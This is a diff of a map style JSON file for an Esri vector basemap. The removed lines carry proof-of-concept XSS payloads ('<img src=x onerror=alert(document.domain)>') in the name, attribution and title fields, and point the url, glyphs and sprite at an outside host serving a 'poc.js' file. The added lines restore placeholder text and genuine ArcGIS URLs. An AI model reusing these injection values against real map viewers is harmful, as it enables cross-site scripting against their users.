@@ -1,11 +1,11 @@
 {
     "version": 8,
-    "name": "<img src=x onerror=alert(document.domain)>",
+    "name": "testtttttttttttaaaaa",
     "sources": {
         "esri": {
             "type": "vector",
-            "attribution": "<img src=x onerror=alert(document.domain)>",
-            "url": "https://ihatedota.com/poc.js?dsr"
+            "attribution": "testtttttttttttttttttttt",
+            "url": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer"
         }
     },
     "layers": [
@@ -14,10 +14,10 @@
             "type": "fill",
             "source": "esri",
             "metadata": {
-                "esri.title": "<img src=x onerror=alert(document.domain)>"
+                "esri.title": "testttttttttttttttttbbbb"
             }
         }
     ],
-    "glyphs": "https://ihatedota.com/poc.js?glyphs",
-    "sprite": "https://ihatedota.com/poc.js?sprite"
+    "glyphs": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer/resources/fonts/",
+    "sprite": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer/resources/sprites/sprite"
 }
